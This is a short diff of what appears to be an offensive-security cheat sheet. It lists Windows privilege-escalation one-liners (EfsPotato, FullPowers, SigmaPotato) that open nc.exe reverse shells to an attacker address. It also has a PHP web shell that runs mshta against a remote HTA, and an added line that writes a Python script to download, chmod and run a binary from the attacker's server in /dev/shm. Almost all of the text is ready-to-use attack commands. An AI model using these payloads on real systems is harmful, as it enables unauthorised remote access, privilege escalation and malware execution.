@@ -291,6 +291,7 @@ C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
+echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
 
 +---------- Listeners ----------+
 python3 -m http.server 8888 -d ~/Upload
